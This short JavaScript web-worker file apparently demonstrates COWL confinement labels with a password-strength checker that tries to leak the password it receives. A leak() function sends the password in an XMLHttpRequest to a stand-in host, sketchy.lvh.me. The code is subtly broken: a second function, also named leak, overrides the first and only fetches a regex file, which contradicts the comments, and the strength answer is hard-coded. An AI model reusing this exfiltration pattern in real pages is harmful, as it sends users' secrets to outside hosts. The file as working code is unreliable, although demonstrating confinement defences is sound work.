// Wait for message from the parent:
onmessage = function(password) {
  // Raise the privacy label:
  COWL.privacyLabel = COWL.privacyLabel.and(password.privacy);
  // Now we can read the password
  console.log('Got your: %s', password.blob);
  // But cannot talk to the network arbitrary:
  leak(password.blob);
  // But we can still compute the strength and reply to the parent:
  postMessage('weak!')
};

// Tell the parent that we're done loading:
postMessage('ready');

// Try to leak the supplied data:
function leak(data) {
  try {
  var req = new XMLHttpRequest();
  req.open('get', 'http://sketchy.lvh.me:3000/yourpass='+data, true);
  req.send();
  } catch(e) {
    console.log("Failed to leak!");
  }
}

// Fetch regular expressions from server
function leak(data) {
  try {
  var req = new XMLHttpRequest();
  req.open('get', 'http://sketchy.lvh.me:3000/checker.regexp', true);
  req.send();
  } catch(e) {
    console.log("Failed to leak!");
  }
}
